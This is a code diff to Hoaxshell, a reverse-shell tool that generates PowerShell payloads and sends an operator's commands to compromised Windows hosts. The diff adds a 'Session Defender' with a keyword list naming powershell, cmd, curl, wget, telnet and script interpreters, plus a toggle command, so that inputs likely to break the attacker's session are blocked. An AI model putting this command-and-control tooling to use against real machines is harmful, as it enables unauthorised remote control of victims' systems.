@@ -170,13 +170,14 @@ def print_banner():
 def promptHelpMsg():
 	print(
 	'''
-	\r  Command                    Description
-	\r  -------                    -----------
-	\r  help                       Print this message.
-	\r  payload                    Print payload (base64).
-	\r  rawpayload                 Print payload (raw).
-	\r  clear                      Clear screen.
-	\r  exit/quit/q                Close session and exit.
+	\r  Command              Description
+	\r  -------              -----------
+	\r  help                 Print this message.
+	\r  payload              Print payload (base64).
+	\r  rawpayload           Print payload (raw).
+	\r  cmdinspector         Turn Session Defender on/off.
+	\r  clear                Clear screen.
+	\r  exit/quit/q          Close session and exit.
 	''')
 
 
@@ -306,6 +307,57 @@ class Tunneling:
 
 		self.process.kill() #Terminate running tunnel process
 		print(f'\r[{WARN}] Tunnel terminated.')
+
+
+
+class Session_Defender:
+
+	is_active = True
+	windows_dangerous_commands = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]		
+	interpreters = ['python', 'python3', 'php', 'ruby', 'irb', 'perl', 'jshell', 'node', 'ghci']
+
+	@staticmethod
+	def inspect_command(os, cmd):
+
+		# Check if command includes unclosed single/double quotes or backticks OR id ends with backslash
+		if Session_Defender.has_unclosed_quotes_or_backticks(cmd):
+			return True
+
+		cmd = cmd.strip().lower()
+
+		# Check for common commands and binaries that start interactive sessions within shells OR prompt the user for input		
+		if cmd in (Session_Defender.windows_dangerous_commands + Session_Defender.interpreters):
+			return True
+
+		return False
+
+
+	@staticmethod
+	def has_unclosed_quotes_or_backticks(cmd):
+
+		stack = []
+
+		for i, c in enumerate(cmd):
+			if c in ["'", '"', "`"]:
+				if not stack or stack[-1] != c:
+					stack.append(c)
+				else:
+					stack.pop()
+			elif c == "\\" and i < len(cmd) - 1:
+				i += 1
+
+		return len(stack) > 0
+
+
+	@staticmethod
+	def ends_with_backslash(cmd):
+		return True if cmd.endswith('\\') else False
+
+
+	@staticmethod
+	def print_warning():
+		print(f'[{WARN}] Dangerous input detected. This command may break the shell session. If you want to execute it anyway, disable the Session Defender by running "cmdinspector".')
+		rst_prompt(prompt = prompt)
 
 
 # -------------- Hoaxshell Server -------------- #
@@ -661,13 +713,11 @@ def main():
 			print(f'[{INFO}] Generating reverse shell payload...')
 
 			if args.localtunnel:
-				source = open(f'{cwd}/payload_templates/https_payload_localtunnel.ps1',
-				              'r') if not args.exec_outfile else open('./payload_templates/https_payload_localtunnel_outfile.ps1', 'r')
+				source = open(f'{cwd}/payload_templates/https_payload_localtunnel.ps1', 'r') if not args.exec_outfile else open('./payload_templates/https_payload_localtunnel_outfile.ps1', 'r')
 
 			elif args.ngrok:
-				source = open(f'{cwd}/payload_templates/https_payload_ngrok.ps1',
-				              'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/https_payload_ngrok_outfile.ps1', 'r')
-				              
+				source = open(f'{cwd}/payload_templates/https_payload_ngrok.ps1','r') if not args.exec_outfile else open(f'{cwd}/payload_templates/https_payload_ngrok_outfile.ps1', 'r')
+				
 			elif not ssl_support:
 				source = open(f'{cwd}/payload_templates/http_payload.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/http_payload_outfile.ps1', 'r')
 			
@@ -723,18 +773,23 @@ def main():
 			if Hoaxshell.prompt_ready:
 
 				user_input = input(prompt).strip()
+				user_input_lower = user_input.lower()
 
-				if user_input.lower() == 'help':
+				if user_input_lower == 'help':
 					promptHelpMsg()
 
-				elif user_input.lower() in ['clear']:
+				elif user_input_lower in ['clear', 'cls']:
 					system('clear')
 
-				elif user_input.lower() in ['payload']:
+				elif user_input_lower in ['payload']:
 					encodePayload(payload)
 
-				elif user_input.lower() in ['rawpayload']:
+				elif user_input_lower in ['rawpayload']:
 					print(f'{PLOAD}{payload}{END}')
+
+				elif user_input_lower == 'cmdinspector':
+					Session_Defender.is_active = not Session_Defender.is_active
+					print(f'Session Defender is turned {"off" if not Session_Defender.is_active else "on"}.')
 
 				elif user_input.lower() in ['exit', 'quit', 'q']:
 					Hoaxshell.terminate()
@@ -745,19 +800,28 @@ def main():
 				else:
 
 					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
-						
-						if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"
-							
-						Hoaxshell.command_pool.append(user_input + f";pwd")
-						Hoaxshell.prompt_ready = False
+
+						# Invoke Session Defender to inspect the command for dangerous input
+						dangerous_input_detected = False
+
+						if Session_Defender.is_active:
+							dangerous_input_detected = Session_Defender.inspect_command(None, user_input)
+
+						if dangerous_input_detected:
+							Session_Defender.print_warning()
+
+						else:						
+							if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"								
+							Hoaxshell.command_pool.append(user_input + f";pwd")
+							Hoaxshell.prompt_ready = False
 
 					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
 						pass
 
 					else:
 						print(f'\r[{INFO}] No active session.')
-			# ~ else:
-				# ~ sleep(0.5)
+			else:
+				sleep(0.1)
 
 
 	except KeyboardInterrupt:
